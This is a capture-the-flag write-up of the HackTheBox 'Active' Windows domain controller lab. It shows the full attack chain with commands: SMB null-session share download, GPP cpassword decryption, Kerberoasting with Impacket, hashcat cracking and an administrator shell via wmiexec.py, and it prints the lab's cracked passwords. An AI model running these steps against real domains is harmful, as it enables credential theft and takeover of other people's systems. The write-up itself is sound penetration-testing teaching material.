---
layout: default
tags: windows smb active_directory
---
# HackTheBox - Active writeup 

![Active Header image](/assets/images/htb_active/active_header.png)

[HackTheBox](https://www.hackthebox.eu/)

## Introduction 

Welcome to the my first writeup for a HackTheBox system. This system is Windows based host that involves enumerating the SMB service to discover some group policy information that we can leverage to enumerate the active directory services and then deploy a Kerberoast attack.

## Initial recon

**Target IP: 10.10.10.100**

### Nmap scan

Start with a nmap TCP SYN (-sV) service version scan (-sV) and run default scripts (-sV) against all ports (-p-) and output to all (-oA) nmap formats. 
```
sudo nmap -sS -sV -sC -p- -vv -oA tcp_syn_ver_def_all 10.10.10.100
```

There is no need to perform a UDP scan as the TCP scan revealed all the relevant information in order to compromise the system.

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Thu Sep  3 13:04:36 2020 as: nmap -sS -sV -sC -p- -vv -oA tcp_syn_ver_def_all_2 10.10.10.100
Increasing send delay for 10.10.10.100 from 0 to 5 due to 403 out of 1342 dropped probes since last increase.
Increasing send delay for 10.10.10.100 from 5 to 10 due to 13 out of 41 dropped probes since last increase.
Nmap scan report for 10.10.10.100
Host is up, received timestamp-reply ttl 127 (0.18s latency).
Scanned at 2020-09-03 13:04:37 EDT for 1381s
Not shown: 65512 closed ports
Reason: 65512 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-09-03 17:26:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49180/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m05s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52471/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 9614/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-03T17:27:36
|_  start_date: 2020-09-03T16:52:07

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  3 13:27:38 2020 -- 1 IP address (1 host up) scanned in 1381.72 seconds
```

## Enumeration

From the nmap scan we can clearly see its a Microsoft Windows machine and that there is DNS (53), Kerberos (88), Active Directory LDAP(3269), SMB (139,445) and some RPC ports open.

Lets investigate the SMB ports further to see if we can find any information.

### SMB

Lets first run *smbmap* and *crackmapexec* and login with a anonymous/null user session to see if there are any shares that we can potentially read.
```
smbmap -u '' -p '' -H 10.10.10.100
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```

As you can see there is one share called `Replication` that we can read, so lets use *smbclient* to connect and see whats inside the share

![SMB Enumeration](/assets/images/htb_active/htb_active_smb_enum_1.jpg)

There are few other folders with various files in them, so lets download the share locally so we can enumerate it easier.

```
# Start an smbclient session
smbclient //10.10.10.100/Replication -u anonymous

# In order to download everything with mget we first need to set a few options type the following commands in the SMB session
RECURSE ON
PROMTP OFF

# Now download everything
mget *
```

When we download the share, there is file called `Groups.xml` which could potentially hold sensitive information. This file is generated by Microsoft's Group Policy Preferences standard used to share computer and user information within a windows domain system.

> Group Policy Preferences is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems. Preference settings are administrative configuration choices deployed to desktops and servers. Preference settings differ from policy settings because users have a choice to alter the administrative configuration. Policy settings administratively enforce setting, which restricts user choice.

> Group Policy Preferences are distributed to domain-joined computers using the Group Policy. The flexibility of Group Policy enables it to deliver opaque configuration data to a domain-joined computer running Windows. The opaque data is then transferred to a Group Policy client side extension at which point the opaque data becomes relevant because the client-side extension understands the data.

[Microsoft Group Policy Preferences](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791(v=ws.11))

![SMB Enumeration](/assets/images/htb_active/htb_active_smb_enum_2.jpg)

If we inspect the Groups.xml file there is a `cpassword` for the `active.htb\SVC_TGS` named used that we can try to crack to gain further access into the machine. This password is encrypted with AES-256 bit encryption, which is relatively secure, however at some point in 2012 [Microsoft published the the AES key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) allowing people to create scripts to programs/scripts decrypt the password.

On Kali Linux we can use a ruby program called *gpp-decrypt* to decrypt our GPP encrypted password.
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

This reveals the plaintext password of `GPPstillStandingStrong2k18` that we can now use to gain an authenticated SMB session. Using crackmapexec with our new found details we can now see that there are more shares listed.

```
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d 'active.htb' --shares
```

Using smbclient again with the credentials we can grab the *user.txt* file
```
smblcient //10.10.10.100/Users -U 'SVC_TGS'
```

![SMB Enumeration](/assets/images/htb_active/htb_active_smb_enum_3.jpg)

We only have read access to these shares. We are going to need to enumerate further to gain a foothold. 

The machine was also running Active Directory LDAP service on port 389 lets enumerate this next.

### Active Directory and Kerberoasting

From the open ports on this machine it looks to be a Active Directory domain controller, we can query this domain controller via LDAP for User and Service Principle (SPN) account information.

Lets use [Impacket python scripts](https://github.com/SecureAuthCorp/impacket) to help us easily enumerate further.


The first script we will use is called `GetADUsers.py`

> This script will gather data about the domain's users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes.

```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
```

The second script we will use is called `GetUserSPNs.py`

> This module will try to find Service Principal Names that are associated with normal user account. Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request will encrypt the ticket with the account the SPN is running under, this could be used for an offline bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.

```
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
```

The `GetADUsers.py` reveals that there is also an `Administrator` user that has logged into the machine previously.

Lets see if there are any Service Principle Names that are associated with any of the accounts using the `GetUserSPNs.py` script. We find that the Administrator account has a Service Principle Name associated with it.

> A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.

[Microsoft Service Principal Names](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

We can issue a request to try and retrieve the Ticket Granting Service (TGS) ticket reply which contains an encrypted NTLM password that we can grab to do an offline password bruteforce attack to try and retrieve the plaintext password. This active directory attach method is called `Kerberoasting`.

![Impacket Scripts](/assets/images/htb_active/htb_active_active_directory_1.jpg)

Lets decrypt the TGS NTLM password hash using hashcat. If we search for `krb5tgs` on the [hashcat example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) you will find that its a *Kerberos 5 TGS-REP etype 23* hash type with the mode value of `13100`
```
 .\hashcat64.exe -a 0 -m 13100 ..\Hashes\htb_active_tgs.txt ..\Wordlists\rockyou.txt
```

![Hashcat](/assets/images/htb_active/htb_active_hashcat.jpg)

Hashcat successfully cracks the password and it is: `Ticketmaster1968`

We can use this password to obtain a shell on the system as the Administrator user, thus compromising this system and then grab the root flag.
We will use the impacket `wmiexec.py` script to obtain a shell. You could alternatively also use `psexec.py` to get a cmd shell if you wish.

> A similar approach to smbexec but executing commands through WMI. Main advantage here is it runs under the user (has to be Admin) account, not SYSTEM, plus, it doesn't generate noisy messages in the event log that smbexec.py does when creating a service. Drawback is it needs DCOM, hence, I have to be able to access  DCOM ports at the target machine.

[wmiexec.py source](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

Lets get a shell as the administrator user using our newly cracked password.
```
wmiexec.py ative.htb/Administrator:Ticketmaster1968@10.10.10.100
```

![Root Flag](/assets/images/htb_active/htb_active_root_shell.jpg)

## Privilege Escalation

There was no real need for privilege escalation as we obtained an Administrators account details above.

## Summary

This was a good machine to learn how to enumerate SMB and Active Directory services in order to look for credentials that we can used to compromise the system.

## References

[Active Directory Security](https://adsecurity.org/)